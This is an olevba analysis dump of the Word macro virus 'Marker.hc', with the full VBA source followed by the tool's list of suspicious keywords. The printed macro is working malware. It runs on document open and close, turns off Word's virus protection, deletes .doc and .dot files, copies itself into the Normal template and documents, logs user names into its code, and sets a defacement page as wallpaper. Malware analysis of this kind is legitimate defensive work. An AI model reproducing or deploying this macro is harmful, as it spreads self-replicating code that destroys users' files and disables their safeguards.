olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hc-9411c00e79b4eae462f8efd46e8eb49d7622eebb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hc-9411c00e79b4eae462f8efd46e8eb49d7622eebb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const Marker = "<- Win9X SuX.. LiNuX SuX... Use UniX"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Bia, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "fayer"
Application.UserInitials = "Aa"
Application.UserAddress = "aku@tanak-cakap.com"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "fayer a.k.a skyline-"
    .Title = "Bi'a, Mat-Kot, Sopi, Shah <- 013-4034031"
    .Subject = "Buat la assignment bebaik..<--pesanan dari Ein"
    .Comments = "Greetings to #ITnet members, biolator, VeRvE^, A||MyLife, ^bLenDy^ and all DALNet peoples...i Hate u All :)"
    .Keywords = "Greetings to #ITnet members, biolator, VeRvE^ and all DALNet peoples...i Hate u All :)"
    .Execute
End With
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.codemodule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.codemodule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Bia = AD.codemodule.Lines(1, AD.codemodule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Bia = Bia & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.codemodule.deletelines 1, NT.codemodule.CountOfLines
   NT.codemodule.AddFromString Bia
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Bia = NT.codemodule.Lines(1, NT.codemodule.CountOfLines)
    AD.codemodule.deletelines 1, AD.codemodule.CountOfLines
    AD.codemodule.AddFromString Bia
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim Tandop As String
On Error Resume Next
 Tandop = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open Tandop & "\playa.html" For Output As #1
 Print #1, "<Html><head><title>School of Malaysian Network..</title></head><Body><body bgcolor = '#000000' >"
 Print #1, "<b><FONT COLOR='#ffffff'><p>W3lc0m3 t0 M4l4ys14n N3tw0rk….. (greetings to all DALnet Member… #ITnet, #IPT</p>"
 Print #1, "<P>Dan channel channel yang bersekongkol...</P>"
 Print #1, "<P>0ur T0p1c… why *.my D0m41ns 4r3 SuX??</P>"
 Print #1, "</FONT><FONT FACE="; Bookman; Old; Style; " COLOR='#ffffff'><P>1 w1sh 1 c4n b3 4 syst3m 4dm1n…</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 n3tw0rk 4dm1n…</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 4 s0ftw4r3 pr0gr4mm3r…</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 'P4g4r B1ll'….</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 Th3 R0ck….</P>"
 Print #1, "<P>1 w1sh 1 c4n b3 S1t1 Nurh4l1z4 b0yfr13nd…</P>"
 Print #1, "<P>1 w1sh 1 c4n h4v3 d1nn3r w1th Br1tn3y Sp34r…</P>"
 Print #1, "<P>1f y0u smmmm33llllllll….. wh4t y0ur mum 1s c00k1ng…. <FONT FACE="; Wingdings; ">&#74;</FONT>"
 Print #1, "<FONT FACE="; Wingdings; ">&#223;</FONT>"
 Print #1, "<P>4y4t M4ut Th3 R0ck..</P>"
 Print #1, "<P>4nd h4v3 4 n1c3 d4yy……</P>"
 Print #1, "</B><P>&nbsp;</P></FONT></BODY></HTML>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = Tandop & "\playa.html"
Return
Finish:
End Sub

' 09:56:59:56:05 PM PM-Saturday, 30 Sep 2000
' fayer
' aku@tanak-cakap.com

 


' 04:52:134:52:13 PM PM-Tuesday, 14 Nov 2000
' fayer
' aku@tanak-cakap.com

 


' 10:52:4710:52:47 AM AM-Friday, 1 Dec 2000
' fayer
' aku@tanak-cakap.com

 


' 10:43:4510:43:45 AM AM-Thursday, 7 Dec 2000
' fayer
' aku@tanak-cakap.com

 


' 12:46:4712:46:47 PM PM-Monday, 8 Jan 2001
' fayer
' aku@tanak-cakap.com

 


' 09:52:119:52:11 AM AM-Tuesday, 20 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 08:02:298:02:29 PM PM-Tuesday, 27 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 11:01:4611:01:46 AM AM-Wednesday, 28 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 08:16:418:16:41 PM PM-Wednesday, 28 Feb 2001
' fayer
' aku@tanak-cakap.com

 


' 04:22:394:22:39 PM PM-Friday, 2 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 03:50:43:50:04 PM PM-Sunday, 4 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 03:14:593:14:59 PM PM-Monday, 5 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 06:17:166:17:16 PM PM-Monday, 5 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 10:40:2810:40:28 AM AM-Wednesday, 7 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 10:43:2610:43:26 AM AM-Friday, 9 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 07:51:57:51:05 PM PM-Friday, 9 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 04:32:574:32:57 PM PM-Saturday, 10 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 10:26:3510:26:35 AM AM-Monday, 12 Mar 2001
' fayer
' aku@tanak-cakap.com

 


' 01:03:421:03:42 PM PM-Wednesday, 25 Apr 2001
' fayer
' aku@tanak-cakap.com

 


' 11:53:211:53:02 Grunge Grunge-Wednesday, 6 Jun 2001
' fayer
' aku@tanak-cakap.com

 


' 01:01:2613:01:26 -Donnerstag, 6 Sep 2001
' fayer
' aku@tanak-cakap.com

 

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

